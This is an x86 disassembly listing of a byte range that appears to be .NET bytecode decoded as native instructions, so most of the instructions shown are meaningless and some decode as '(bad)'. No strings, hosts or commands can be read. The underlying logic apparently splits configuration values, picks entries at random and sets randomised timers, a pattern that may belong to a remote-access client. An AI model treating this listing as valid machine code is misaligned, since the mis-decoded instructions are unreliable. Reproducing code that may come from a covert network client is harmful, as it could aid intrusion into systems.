  402b8d:	00 70 80             	add    %dh,-0x80(%eax)
  402b90:	10 00                	adc    %al,(%eax)
  402b92:	00 04 72             	add    %al,(%edx,%esi,2)
  402b95:	36 12 00             	adc    %ss:(%eax),%al
  402b98:	70 80                	jo     0x402b1a
  402b9a:	11 00                	adc    %eax,(%eax)
  402b9c:	00 04 72             	add    %al,(%edx,%esi,2)
  402b9f:	e9 12 00 70 80       	jmp    0x80b02bb6
  402ba4:	12 00                	adc    (%eax),%al
  402ba6:	00 04 72             	add    %al,(%edx,%esi,2)
  402ba9:	9c                   	pushf
  402baa:	13 00                	adc    (%eax),%eax
  402bac:	70 80                	jo     0x402b2e
  402bae:	13 00                	adc    (%eax),%eax
  402bb0:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402bb3:	00 1b                	add    %bl,(%ebx)
  402bb5:	30 07                	xor    %al,(%edi)
  402bb7:	00 f1                	add    %dh,%cl
  402bb9:	02 00                	add    (%eax),%al
  402bbb:	00 04 00             	add    %al,(%eax,%eax,1)
  402bbe:	00 11                	add    %dl,(%ecx)
  402bc0:	18 17                	sbb    %dl,(%edi)
  402bc2:	1c 73                	sbb    $0x73,%al
  402bc4:	28 00                	sub    %al,(%eax)
  402bc6:	00 0a                	add    %cl,(%edx)
  402bc8:	25 20 00 c8 00       	and    $0xc80020,%eax
  402bcd:	00 6f 29             	add    %ch,0x29(%edi)
  402bd0:	00 00                	add    %al,(%eax)
  402bd2:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402bd8:	00 6f 2a             	add    %ch,0x2a(%edi)
  402bdb:	00 00                	add    %al,(%eax)
  402bdd:	0a 28                	or     (%eax),%ch
  402bdf:	07                   	pop    %es
  402be0:	00 00                	add    %al,(%eax)
  402be2:	06                   	push   %es
  402be3:	7e 0d                	jle    0x402bf2
  402be5:	00 00                	add    %al,(%eax)
  402be7:	04 72                	add    $0x72,%al
  402be9:	4f                   	dec    %edi
  402bea:	14 00                	adc    $0x0,%al
  402bec:	70 28                	jo     0x402c16
  402bee:	2b 00                	sub    (%eax),%eax
  402bf0:	00 0a                	add    %cl,(%edx)
  402bf2:	39 e3                	cmp    %esp,%ebx
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	00 7e 02             	add    %bh,0x2(%esi)
  402bf9:	00 00                	add    %al,(%eax)
  402bfb:	04 17                	add    $0x17,%al
  402bfd:	8d 49 00             	lea    0x0(%ecx),%ecx
  402c00:	00 01                	add    %al,(%ecx)
  402c02:	25 16 1f 2c 9d       	and    $0x9d2c1f16,%eax
  402c07:	6f                   	outsl  %ds:(%esi),(%dx)
  402c08:	2c 00                	sub    $0x0,%al
  402c0a:	00 0a                	add    %cl,(%edx)
  402c0c:	73 2d                	jae    0x402c3b
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	0a 7e 02             	or     0x2(%esi),%bh
  402c13:	00 00                	add    %al,(%eax)
  402c15:	04 17                	add    $0x17,%al
  402c17:	8d 49 00             	lea    0x0(%ecx),%ecx
  402c1a:	00 01                	add    %al,(%ecx)
  402c1c:	25 16 1f 2c 9d       	and    $0x9d2c1f16,%eax
  402c21:	6f                   	outsl  %ds:(%esi),(%dx)
  402c22:	2c 00                	sub    $0x0,%al
  402c24:	00 0a                	add    %cl,(%edx)
  402c26:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402c29:	2e 00 00             	add    %al,%cs:(%eax)
  402c2c:	0a 9a 0a 7e 01 00    	or     0x17e0a(%edx),%bl
  402c32:	00 04 17             	add    %al,(%edi,%edx,1)
  402c35:	8d 49 00             	lea    0x0(%ecx),%ecx
  402c38:	00 01                	add    %al,(%ecx)
  402c3a:	25 16 1f 2c 9d       	and    $0x9d2c1f16,%eax
  402c3f:	6f                   	outsl  %ds:(%esi),(%dx)
  402c40:	2c 00                	sub    $0x0,%al
  402c42:	00 0a                	add    %cl,(%edx)
  402c44:	73 2d                	jae    0x402c73
  402c46:	00 00                	add    %al,(%eax)
  402c48:	0a 7e 01             	or     0x1(%esi),%bh
  402c4b:	00 00                	add    %al,(%eax)
  402c4d:	04 17                	add    $0x17,%al
  402c4f:	8d 49 00             	lea    0x0(%ecx),%ecx
  402c52:	00 01                	add    %al,(%ecx)
  402c54:	25 16 1f 2c 9d       	and    $0x9d2c1f16,%eax
  402c59:	6f                   	outsl  %ds:(%esi),(%dx)
  402c5a:	2c 00                	sub    $0x0,%al
  402c5c:	00 0a                	add    %cl,(%edx)
  402c5e:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402c61:	2e 00 00             	add    %al,%cs:(%eax)
  402c64:	0a 9a 28 18 00 00    	or     0x1828(%edx),%bl
  402c6a:	0a 0b                	or     (%ebx),%cl
  402c6c:	06                   	push   %es
  402c6d:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402c70:	00 06                	add    %al,(%esi)
  402c72:	39 52 00             	cmp    %edx,0x0(%edx)
  402c75:	00 00                	add    %al,(%eax)
  402c77:	06                   	push   %es
  402c78:	28 2f                	sub    %ch,(%edi)
  402c7a:	00 00                	add    %al,(%eax)
  402c7c:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402c7f:	0d 38 39 00 00       	or     $0x3938,%eax
  402c84:	00 08                	add    %cl,(%eax)
  402c86:	09 a3 42 00 00 01    	or     %esp,0x1000042(%ebx)
  402c8c:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402c8f:	06                   	push   %es
  402c90:	00 00                	add    %al,(%eax)
  402c92:	06                   	push   %es
  402c93:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402c96:	6f                   	outsl  %ds:(%esi),(%dx)
  402c97:	30 00                	xor    %al,(%eax)
  402c99:	00 0a                	add    %cl,(%edx)
  402c9b:	28 06                	sub    %al,(%esi)
  402c9d:	00 00                	add    %al,(%eax)
  402c9f:	06                   	push   %es
  402ca0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ca1:	31 00                	xor    %eax,(%eax)
  402ca3:	00 0a                	add    %cl,(%edx)
  402ca5:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402cab:	c3                   	ret
  402cac:	00 00                	add    %al,(%eax)
  402cae:	00 dd                	add    %bl,%ch
  402cb0:	06                   	push   %es
  402cb1:	00 00                	add    %al,(%eax)
  402cb3:	00 26                	add    %ah,(%esi)
  402cb5:	dd 00                	fldl   (%eax)
  402cb7:	00 00                	add    %al,(%eax)
  402cb9:	00 09                	add    %cl,(%ecx)
  402cbb:	17                   	pop    %ss
  402cbc:	58                   	pop    %eax
  402cbd:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402cc2:	32 c1                	xor    %cl,%al
  402cc4:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402cca:	06                   	push   %es
  402ccb:	00 00                	add    %al,(%eax)
  402ccd:	06                   	push   %es
  402cce:	06                   	push   %es
  402ccf:	07                   	pop    %es
  402cd0:	6f                   	outsl  %ds:(%esi),(%dx)
  402cd1:	32 00                	xor    (%eax),%al
  402cd3:	00 0a                	add    %cl,(%edx)
  402cd5:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402cdb:	33 00                	xor    (%eax),%eax
  402cdd:	00 0a                	add    %cl,(%edx)
  402cdf:	13 05 72 59 14 00    	adc    0x145972,%eax
  402ce5:	70 72                	jo     0x402d59
  402ce7:	59                   	pop    %ecx
  402ce8:	14 00                	adc    $0x0,%al
  402cea:	70 73                	jo     0x402d5f
  402cec:	34 00                	xor    $0x0,%al
  402cee:	00 0a                	add    %cl,(%edx)
  402cf0:	13 06                	adc    (%esi),%eax
  402cf2:	11 05 11 06 6f 35    	adc    %eax,0x356f0611
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	0a 11                	or     (%ecx),%dl
  402cfc:	05 7e 0d 00 00       	add    $0xd7e,%eax
  402d01:	04 6f                	add    $0x6f,%al
  402d03:	36 00 00             	add    %al,%ss:(%eax)
  402d06:	0a 17                	or     (%edi),%dl
  402d08:	8d 48 00             	lea    0x0(%eax),%ecx
  402d0b:	00 01                	add    %al,(%ecx)
  402d0d:	25 16 72 5b 14       	and    $0x145b7216,%eax
  402d12:	00 70 a2             	add    %dh,-0x5e(%eax)
  402d15:	16                   	push   %ss
  402d16:	6f                   	outsl  %ds:(%esi),(%dx)
  402d17:	37                   	aaa
  402d18:	00 00                	add    %al,(%eax)
  402d1a:	0a 13                	or     (%ebx),%dl
  402d1c:	07                   	pop    %es
  402d1d:	11 07                	adc    %eax,(%edi)
  402d1f:	16                   	push   %ss
  402d20:	a3 48 00 00 01       	mov    %eax,0x1000048
  402d25:	80 02 00             	addb   $0x0,(%edx)
  402d28:	00 04 11             	add    %al,(%ecx,%edx,1)
  402d2b:	07                   	pop    %es
  402d2c:	73 2d                	jae    0x402d5b
  402d2e:	00 00                	add    %al,(%eax)
  402d30:	0a 17                	or     (%edi),%dl
  402d32:	11 07                	adc    %eax,(%edi)
  402d34:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402d37:	38 00                	cmp    %al,(%eax)
  402d39:	00 0a                	add    %cl,(%edx)
  402d3b:	a3 48 00 00 01       	mov    %eax,0x1000048
  402d40:	80 01 00             	addb   $0x0,(%ecx)
  402d43:	00 04 28             	add    %al,(%eax,%ebp,1)
  402d46:	06                   	push   %es
  402d47:	00 00                	add    %al,(%eax)
  402d49:	06                   	push   %es
  402d4a:	7e 02                	jle    0x402d4e
  402d4c:	00 00                	add    %al,(%eax)
  402d4e:	04 7e                	add    $0x7e,%al
  402d50:	01 00                	add    %eax,(%eax)
  402d52:	00 04 28             	add    %al,(%eax,%ebp,1)
  402d55:	18 00                	sbb    %al,(%eax)
  402d57:	00 0a                	add    %cl,(%edx)
  402d59:	6f                   	outsl  %ds:(%esi),(%dx)
  402d5a:	32 00                	xor    (%eax),%al
  402d5c:	00 0a                	add    %cl,(%edx)
  402d5e:	dd 0f                	fisttpll (%edi)
  402d60:	00 00                	add    %al,(%eax)
  402d62:	00 11                	add    %dl,(%ecx)
  402d64:	05 39 07 00 00       	add    $0x739,%eax
  402d69:	00 11                	add    %dl,(%ecx)
  402d6b:	05 6f 27 00 00       	add    $0x276f,%eax
  402d70:	0a dc                	or     %ah,%bl
  402d72:	28 06                	sub    %al,(%esi)
  402d74:	00 00                	add    %al,(%eax)
  402d76:	06                   	push   %es
  402d77:	6f                   	outsl  %ds:(%esi),(%dx)
  402d78:	31 00                	xor    %eax,(%eax)
  402d7a:	00 0a                	add    %cl,(%edx)
  402d7c:	39 18                	cmp    %ebx,(%eax)
  402d7e:	01 00                	add    %eax,(%eax)
  402d80:	00 17                	add    %dl,(%edi)
  402d82:	28 13                	sub    %dl,(%ebx)
  402d84:	00 00                	add    %al,(%eax)
  402d86:	06                   	push   %es
  402d87:	28 06                	sub    %al,(%esi)
  402d89:	00 00                	add    %al,(%eax)
  402d8b:	06                   	push   %es
  402d8c:	17                   	pop    %ss
  402d8d:	73 39                	jae    0x402dc8
  402d8f:	00 00                	add    %al,(%eax)
  402d91:	0a 16                	or     (%esi),%dl
  402d93:	14 fe                	adc    $0xfe,%al
  402d95:	06                   	push   %es
  402d96:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402d9b:	3a 00                	cmp    (%eax),%al
  402d9d:	00 0a                	add    %cl,(%edx)
  402d9f:	73 3b                	jae    0x402ddc
  402da1:	00 00                	add    %al,(%eax)
  402da3:	0a 28                	or     (%eax),%ch
  402da5:	09 00                	or     %eax,(%eax)
  402da7:	00 06                	add    %al,(%esi)
  402da9:	28 08                	sub    %cl,(%eax)
  402dab:	00 00                	add    %al,(%eax)
  402dad:	06                   	push   %es
  402dae:	28 06                	sub    %al,(%esi)
  402db0:	00 00                	add    %al,(%eax)
  402db2:	06                   	push   %es
  402db3:	6f                   	outsl  %ds:(%esi),(%dx)
  402db4:	3c 00                	cmp    $0x0,%al
  402db6:	00 0a                	add    %cl,(%edx)
  402db8:	6f                   	outsl  %ds:(%esi),(%dx)
  402db9:	3d 00 00 0a 17       	cmp    $0x170a0000,%eax
  402dbe:	8d 49 00             	lea    0x0(%ecx),%ecx
  402dc1:	00 01                	add    %al,(%ecx)
  402dc3:	25 16 1f 3a 9d       	and    $0x9d3a1f16,%eax
  402dc8:	6f                   	outsl  %ds:(%esi),(%dx)
  402dc9:	2c 00                	sub    $0x0,%al
  402dcb:	00 0a                	add    %cl,(%edx)
  402dcd:	16                   	push   %ss
  402dce:	a3 48 00 00 01       	mov    %eax,0x1000048
  402dd3:	14 20                	adc    $0x20,%al
  402dd5:	c0 00 00             	rolb   $0x0,(%eax)
  402dd8:	00 16                	add    %dl,(%esi)
  402dda:	6f                   	outsl  %ds:(%esi),(%dx)
  402ddb:	3e 00 00             	add    %al,%ds:(%eax)
  402dde:	0a 1a                	or     (%edx),%bl
  402de0:	6a 28                	push   $0x28
  402de2:	0d 00 00 06 28       	or     $0x28060000,%eax
  402de7:	0c 00                	or     $0x0,%al
  402de9:	00 06                	add    %al,(%esi)
  402deb:	d4 8d                	aam    $0x8d
  402ded:	53                   	push   %ebx
  402dee:	00 00                	add    %al,(%eax)
  402df0:	01 28                	add    %ebp,(%eax)
  402df2:	0b 00                	or     (%eax),%eax
  402df4:	00 06                	add    %al,(%esi)
  402df6:	16                   	push   %ss
  402df7:	6a 28                	push   $0x28
  402df9:	0f 00 00             	sldt   (%eax)
  402dfc:	06                   	push   %es
  402dfd:	28 48 00             	sub    %cl,0x0(%eax)
  402e00:	00 06                	add    %al,(%esi)
  402e02:	28 20                	sub    %ah,(%eax)
  402e04:	00 00                	add    %al,(%eax)
  402e06:	06                   	push   %es
  402e07:	16                   	push   %ss
  402e08:	28 18                	sub    %bl,(%eax)
  402e0a:	00 00                	add    %al,(%eax)
  402e0c:	06                   	push   %es
  402e0d:	16                   	push   %ss
  402e0e:	28 1a                	sub    %bl,(%edx)
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	14 fe                	adc    $0xfe,%al
  402e15:	06                   	push   %es
  402e16:	21 00                	and    %eax,(%eax)
  402e18:	00 06                	add    %al,(%esi)
  402e1a:	73 3f                	jae    0x402e5b
  402e1c:	00 00                	add    %al,(%eax)
  402e1e:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402e21:	2d 00 00 0a 20       	sub    $0x200a0000,%eax
  402e26:	10 27                	adc    %ah,(%edi)
  402e28:	00 00                	add    %al,(%eax)
  402e2a:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402e30:	38 00                	cmp    %al,(%eax)
  402e32:	00 0a                	add    %cl,(%edx)
  402e34:	73 2d                	jae    0x402e63
  402e36:	00 00                	add    %al,(%eax)
  402e38:	0a 20                	or     (%eax),%ah
  402e3a:	10 27                	adc    %ah,(%edi)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402e44:	38 00                	cmp    %al,(%eax)
  402e46:	00 0a                	add    %cl,(%edx)
  402e48:	73 40                	jae    0x402e8a
  402e4a:	00 00                	add    %al,(%eax)
  402e4c:	0a 28                	or     (%eax),%ch
  402e4e:	11 00                	adc    %eax,(%eax)
  402e50:	00 06                	add    %al,(%esi)
  402e52:	14 fe                	adc    $0xfe,%al
  402e54:	06                   	push   %es
  402e55:	22 00                	and    (%eax),%al
  402e57:	00 06                	add    %al,(%esi)
  402e59:	73 3f                	jae    0x402e9a
  402e5b:	00 00                	add    %al,(%eax)
  402e5d:	0a 14 17             	or     (%edi,%edx,1),%dl
  402e60:	17                   	pop    %ss
  402e61:	73 40                	jae    0x402ea3
  402e63:	00 00                	add    %al,(%eax)
  402e65:	0a 28                	or     (%eax),%ch
  402e67:	16                   	push   %ss
  402e68:	00 00                	add    %al,(%eax)
  402e6a:	06                   	push   %es
  402e6b:	28 08                	sub    %cl,(%eax)
  402e6d:	00 00                	add    %al,(%eax)
  402e6f:	06                   	push   %es
  402e70:	28 0a                	sub    %cl,(%edx)
  402e72:	00 00                	add    %al,(%eax)
  402e74:	06                   	push   %es
  402e75:	28 0e                	sub    %cl,(%esi)
  402e77:	00 00                	add    %al,(%eax)
  402e79:	06                   	push   %es
  402e7a:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402e80:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402e87:	06                   	push   %es
  402e88:	73 41                	jae    0x402ecb
  402e8a:	00 00                	add    %al,(%eax)
  402e8c:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402e8f:	42                   	inc    %edx
  402e90:	00 00                	add    %al,(%eax)
  402e92:	0a 26                	or     (%esi),%ah
  402e94:	38 06                	cmp    %al,(%esi)
  402e96:	00 00                	add    %al,(%eax)
  402e98:	00 16                	add    %dl,(%esi)
  402e9a:	28 13                	sub    %dl,(%ebx)
  402e9c:	00 00                	add    %al,(%eax)
  402e9e:	06                   	push   %es
  402e9f:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ea2:	00 00                	add    %al,(%eax)
  402ea4:	26 16                	es push %ss
  402ea6:	28 13                	sub    %dl,(%ebx)
  402ea8:	00 00                	add    %al,(%eax)
  402eaa:	06                   	push   %es
  402eab:	dd 00                	fldl   (%eax)
  402ead:	00 00                	add    %al,(%eax)
  402eaf:	00 2a                	add    %ch,(%edx)
  402eb1:	00 00                	add    %al,(%eax)
  402eb3:	00 41 4c             	add    %al,0x4c(%ecx)
  402eb6:	00 00                	add    %al,(%eax)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	00 00                	add    %al,(%eax)
  402ebc:	ce                   	into
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	00 26                	add    %ah,(%esi)
  402ec1:	00 00                	add    %al,(%eax)
  402ec3:	00 f4                	add    %dh,%ah
  402ec5:	00 00                	add    %al,(%eax)
  402ec7:	00 06                	add    %al,(%esi)
  402ec9:	00 00                	add    %al,(%eax)
  402ecb:	00 01                	add    %al,(%ecx)
  402ecd:	00 00                	add    %al,(%eax)
  402ecf:	01 02                	add    %eax,(%edx)
  402ed1:	00 00                	add    %al,(%eax)
  402ed3:	00 21                	add    %ah,(%ecx)
  402ed5:	01 00                	add    %eax,(%eax)
  402ed7:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402edd:	01 00                	add    %eax,(%eax)
  402edf:	00 0f                	add    %cl,(%edi)
	...
  402eed:	00 00                	add    %al,(%eax)
  402eef:	00 e4                	add    %ah,%ah
  402ef1:	02 00                	add    (%eax),%al
  402ef3:	00 e4                	add    %ah,%ah
  402ef5:	02 00                	add    (%eax),%al
  402ef7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402efa:	00 00                	add    %al,(%eax)
  402efc:	01 00                	add    %eax,(%eax)
  402efe:	00 01                	add    %al,(%ecx)
  402f00:	1b 30                	sbb    (%eax),%esi
  402f02:	02 00                	add    (%eax),%al
  402f04:	6a 00                	push   $0x0
  402f06:	00 00                	add    %al,(%eax)
  402f08:	00 00                	add    %al,(%eax)
  402f0a:	00 00                	add    %al,(%eax)
  402f0c:	28 15 00 00 06 25    	sub    %dl,0x25060000
  402f12:	3a 06                	cmp    (%esi),%al
  402f14:	00 00                	add    %al,(%eax)
  402f16:	00 26                	add    %ah,(%esi)
  402f18:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402f1e:	45                   	inc    %ebp
  402f1f:	00 00                	add    %al,(%eax)
  402f21:	0a 28                	or     (%eax),%ch
  402f23:	10 00                	adc    %al,(%eax)
  402f25:	00 06                	add    %al,(%esi)
  402f27:	25 3a 06 00 00       	and    $0x63a,%eax
  402f2c:	00 26                	add    %ah,(%esi)
  402f2e:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402f34:	45                   	inc    %ebp
  402f35:	00 00                	add    %al,(%eax)
  402f37:	0a 28                	or     (%eax),%ch
  402f39:	08 00                	or     %al,(%eax)
  402f3b:	00 06                	add    %al,(%esi)
  402f3d:	25 3a 06 00 00       	and    $0x63a,%eax
  402f42:	00 26                	add    %ah,(%esi)
  402f44:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402f4a:	46                   	inc    %esi
  402f4b:	00 00                	add    %al,(%eax)
  402f4d:	0a 28                	or     (%eax),%ch
  402f4f:	06                   	push   %es
  402f50:	00 00                	add    %al,(%eax)
  402f52:	06                   	push   %es
  402f53:	25 3a 06 00 00       	and    $0x63a,%eax
  402f58:	00 26                	add    %ah,(%esi)
  402f5a:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402f60:	47                   	inc    %edi
  402f61:	00 00                	add    %al,(%eax)
  402f63:	0a dd                	or     %ch,%bl
  402f65:	06                   	push   %es
  402f66:	00 00                	add    %al,(%eax)
  402f68:	00 26                	add    %ah,(%esi)
  402f6a:	dd 00                	fldl   (%eax)
  402f6c:	00 00                	add    %al,(%eax)
  402f6e:	00 16                	add    %dl,(%esi)
  402f70:	28 13                	sub    %dl,(%ebx)
  402f72:	00 00                	add    %al,(%eax)
  402f74:	06                   	push   %es
  402f75:	2a 00                	sub    (%eax),%al
  402f77:	00 01                	add    %al,(%ecx)
  402f79:	10 00                	adc    %al,(%eax)
  402f7b:	00 00                	add    %al,(%eax)
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402f82:	00 06                	add    %al,(%esi)
  402f84:	01 00                	add    %eax,(%eax)
  402f86:	00 01                	add    %al,(%ecx)
  402f88:	1b 30                	sbb    (%eax),%esi
  402f8a:	06                   	push   %es
  402f8b:	00 ba 01 00 00 05    	add    %bh,0x5000001(%edx)
  402f91:	00 00                	add    %al,(%eax)
  402f93:	11 28                	adc    %ebp,(%eax)
  402f95:	06                   	push   %es
  402f96:	00 00                	add    %al,(%eax)
  402f98:	06                   	push   %es
  402f99:	6f                   	outsl  %ds:(%esi),(%dx)
  402f9a:	31 00                	xor    %eax,(%eax)
  402f9c:	00 0a                	add    %cl,(%edx)
  402f9e:	39 0a                	cmp    %ecx,(%edx)
  402fa0:	00 00                	add    %al,(%eax)
  402fa2:	00 28                	add    %ch,(%eax)
  402fa4:	12 00                	adc    (%eax),%al
  402fa6:	00 06                	add    %al,(%esi)
  402fa8:	3a 0b                	cmp    (%ebx),%cl
  402faa:	00 00                	add    %al,(%eax)
  402fac:	00 16                	add    %dl,(%esi)
  402fae:	28 13                	sub    %dl,(%ebx)
  402fb0:	00 00                	add    %al,(%eax)
  402fb2:	06                   	push   %es
  402fb3:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402fb9:	08 00                	or     %al,(%eax)
  402fbb:	00 06                	add    %al,(%esi)
  402fbd:	02 6f 48             	add    0x48(%edi),%ch
  402fc0:	00 00                	add    %al,(%eax)
  402fc2:	0a 0a                	or     (%edx),%cl
  402fc4:	06                   	push   %es
  402fc5:	16                   	push   %ss
  402fc6:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402fca:	00 28                	add    %ch,(%eax)
  402fcc:	0e                   	push   %cs
  402fcd:	00 00                	add    %al,(%eax)
  402fcf:	06                   	push   %es
  402fd0:	06                   	push   %es
  402fd1:	6a 58                	push   $0x58
  402fd3:	28 0f                	sub    %cl,(%edi)
  402fd5:	00 00                	add    %al,(%eax)
  402fd7:	06                   	push   %es
  402fd8:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402fdb:	00 06                	add    %al,(%esi)
  402fdd:	06                   	push   %es
  402fde:	6a 59                	push   $0x59
  402fe0:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402fe6:	0c 00                	or     $0x0,%al
  402fe8:	00 06                	add    %al,(%esi)
  402fea:	3a 02                	cmp    (%edx),%al
  402fec:	01 00                	add    %eax,(%eax)
  402fee:	00 28                	add    %ch,(%eax)
  402ff0:	0a 00                	or     (%eax),%al
  402ff2:	00 06                	add    %al,(%esi)
  402ff4:	16                   	push   %ss
  402ff5:	28 49 00             	sub    %cl,0x0(%ecx)
  402ff8:	00 0a                	add    %cl,(%edx)
  402ffa:	6a 28                	push   $0x28
  402ffc:	0d 00 00 06 28       	or     $0x28060000,%eax
  403001:	0c 00                	or     $0x0,%al
  403003:	00 06                	add    %al,(%esi)
  403005:	16                   	push   %ss
  403006:	6a 3e                	push   $0x3e
  403008:	c2 00 00             	ret    $0x0
  40300b:	00 16                	add    %dl,(%esi)
  40300d:	6a 28                	push   $0x28
  40300f:	0f 00 00             	sldt   (%eax)
  403012:	06                   	push   %es
  403013:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403016:	00 06                	add    %al,(%esi)
  403018:	d4 8d                	aam    $0x8d
  40301a:	53                   	push   %ebx
  40301b:	00 00                	add    %al,(%eax)
  40301d:	01 28                	add    %ebp,(%eax)
  40301f:	0b 00                	or     (%eax),%eax
  403021:	00 06                	add    %al,(%esi)
  403023:	38 5f 00             	cmp    %bl,0x0(%edi)
  403026:	00 00                	add    %al,(%eax)
  403028:	28 08                	sub    %cl,(%eax)
  40302a:	00 00                	add    %al,(%eax)
  40302c:	06                   	push   %es
  40302d:	28 0a                	sub    %cl,(%edx)
  40302f:	00 00                	add    %al,(%eax)
  403031:	06                   	push   %es
  403032:	28 0e                	sub    %cl,(%esi)
  403034:	00 00                	add    %al,(%eax)
  403036:	06                   	push   %es
  403037:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  40303d:	69 6f 4a 00 00 0a 0b 	imul   $0xb0a0000,0x4a(%edi),%ebp
  403044:	07                   	pop    %es
  403045:	16                   	push   %ss
  403046:	3d 0b 00 00 00       	cmp    $0xb,%eax
  40304b:	16                   	push   %ss
  40304c:	28 13                	sub    %dl,(%ebx)
  40304e:	00 00                	add    %al,(%eax)
  403050:	06                   	push   %es
  403051:	dd f7                	(bad)
  403053:	00 00                	add    %al,(%eax)
  403055:	00 28                	add    %ch,(%eax)
  403057:	0e                   	push   %cs
  403058:	00 00                	add    %al,(%eax)
  40305a:	06                   	push   %es
  40305b:	07                   	pop    %es
  40305c:	6a 58                	push   $0x58
  40305e:	28 0f                	sub    %cl,(%edi)
  403060:	00 00                	add    %al,(%eax)
  403062:	06                   	push   %es
  403063:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403066:	00 06                	add    %al,(%esi)
  403068:	07                   	pop    %es
  403069:	6a 59                	push   $0x59
  40306b:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  403071:	0c 00                	or     $0x0,%al
  403073:	00 06                	add    %al,(%esi)
  403075:	16                   	push   %ss
  403076:	6a 3c                	push   $0x3c
  403078:	0b 00                	or     (%eax),%eax
  40307a:	00 00                	add    %al,(%eax)
  40307c:	16                   	push   %ss
  40307d:	28 13                	sub    %dl,(%ebx)
  40307f:	00 00                	add    %al,(%eax)
  403081:	06                   	push   %es
  403082:	dd c6                	ffree  %st(6)
  403084:	00 00                	add    %al,(%eax)
  403086:	00 28                	add    %ch,(%eax)
  403088:	0c 00                	or     $0x0,%al
  40308a:	00 06                	add    %al,(%esi)
  40308c:	16                   	push   %ss
  40308d:	6a 30                	push   $0x30
  40308f:	98                   	cwtl
  403090:	14 fe                	adc    $0xfe,%al
  403092:	06                   	push   %es
  403093:	23 00                	and    (%eax),%eax
  403095:	00 06                	add    %al,(%esi)
  403097:	73 4b                	jae    0x4030e4
  403099:	00 00                	add    %al,(%eax)
  40309b:	0a 73 4c             	or     0x4c(%ebx),%dh
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	0a 28                	or     (%eax),%ch
  4030a2:	0a 00                	or     (%eax),%al
  4030a4:	00 06                	add    %al,(%esi)
  4030a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4030a7:	4d                   	dec    %ebp
  4030a8:	00 00                	add    %al,(%eax)
  4030aa:	0a 16                	or     (%esi),%dl
  4030ac:	6a 28                	push   $0x28
  4030ae:	0f 00 00             	sldt   (%eax)
  4030b1:	06                   	push   %es
  4030b2:	1a 6a 28             	sbb    0x28(%edx),%ch
  4030b5:	0d 00 00 06 28       	or     $0x28060000,%eax
  4030ba:	0c 00                	or     $0x0,%al
  4030bc:	00 06                	add    %al,(%esi)
  4030be:	d4 8d                	aam    $0x8d
  4030c0:	53                   	push   %ebx
  4030c1:	00 00                	add    %al,(%eax)
  4030c3:	01 28                	add    %ebp,(%eax)
  4030c5:	0b 00                	or     (%eax),%eax
  4030c7:	00 06                	add    %al,(%esi)
  4030c9:	38 3a                	cmp    %bh,(%edx)
  4030cb:	00 00                	add    %al,(%eax)
  4030cd:	00 1a                	add    %bl,(%edx)
  4030cf:	6a 28                	push   $0x28
  4030d1:	0d 00 00 06 28       	or     $0x28060000,%eax
  4030d6:	0c 00                	or     $0x0,%al
  4030d8:	00 06                	add    %al,(%esi)
  4030da:	d4 8d                	aam    $0x8d
  4030dc:	53                   	push   %ebx
  4030dd:	00 00                	add    %al,(%eax)
  4030df:	01 28                	add    %ebp,(%eax)
  4030e1:	0b 00                	or     (%eax),%eax
  4030e3:	00 06                	add    %al,(%esi)
  4030e5:	16                   	push   %ss
  4030e6:	6a 28                	push   $0x28
  4030e8:	0f 00 00             	sldt   (%eax)
  4030eb:	06                   	push   %es
  4030ec:	38 17                	cmp    %dl,(%edi)
  4030ee:	00 00                	add    %al,(%eax)
  4030f0:	00 28                	add    %ch,(%eax)
  4030f2:	0c 00                	or     $0x0,%al
  4030f4:	00 06                	add    %al,(%esi)
  4030f6:	16                   	push   %ss
  4030f7:	6a 3c                	push   $0x3c
  4030f9:	0b 00                	or     (%eax),%eax
  4030fb:	00 00                	add    %al,(%eax)
  4030fd:	16                   	push   %ss
  4030fe:	28 13                	sub    %dl,(%ebx)
  403100:	00 00                	add    %al,(%eax)
  403102:	06                   	push   %es
  403103:	dd 45 00             	fldl   0x0(%ebp)
